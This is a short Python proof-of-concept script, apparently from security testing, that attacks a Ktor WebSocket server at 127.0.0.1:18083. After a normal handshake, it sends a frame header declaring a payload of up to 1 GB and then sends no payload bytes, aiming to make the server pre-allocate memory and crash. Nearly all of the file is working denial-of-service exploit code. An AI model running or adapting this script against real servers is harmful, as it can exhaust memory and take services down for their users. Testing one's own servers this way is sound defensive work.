#!/usr/bin/env python3
"""R5-3: ktor ws 帧预分配攻击 — 仅发送帧头声明大长度, 不发 payload"""
import socket, struct, sys, os, time

def handshake(sock):
    key = "dGhlIHNhbXBsZSBub25jZQ=="
    req = (f"GET /ws HTTP/1.1\r\nHost: 127.0.0.1:18083\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    sock.sendall(req.encode())
    resp = sock.recv(4096)
    assert b"101" in resp, resp[:200]

def send_frame_header(sock, declared_len):
    """FIN=1, opcode=2(binary), masked, 64-bit extended length"""
    hdr = bytearray([0x82])  # FIN + binary
    mask = 0x80
    if declared_len < 126:
        hdr.append(mask | declared_len)
    elif declared_len < 65536:
        hdr.append(mask | 126)
        hdr += struct.pack(">H", declared_len)
    else:
        hdr.append(mask | 127)
        hdr += struct.pack(">Q", declared_len)
    hdr += b"\x01\x02\x03\x04"  # mask key
    sock.sendall(bytes(hdr))
    print(f"[+] sent frame header, declared payload length = {declared_len} "
          f"({declared_len/1024/1024:.0f}MB), no payload bytes sent")

def main():
    declared = int(sys.argv[1]) if len(sys.argv) > 1 else 1 << 30  # 1GB
    s = socket.create_connection(("127.0.0.1", 18083), timeout=5)
    handshake(s)
    time.sleep(0.5)
    send_frame_header(s, declared)
    # 观察服务端反应: 尝试读回 (服务器可能无响应/关闭)
    try:
        s.settimeout(3)
        data = s.recv(1024)
        print(f"[+] server response: {data[:80]!r}")
    except socket.timeout:
        print("[+] no immediate response (server busy allocating?)")
    except ConnectionResetError:
        print("[+] CONNECTION RESET — server thread crashed")
    time.sleep(2)

if __name__ == "__main__":
    main()
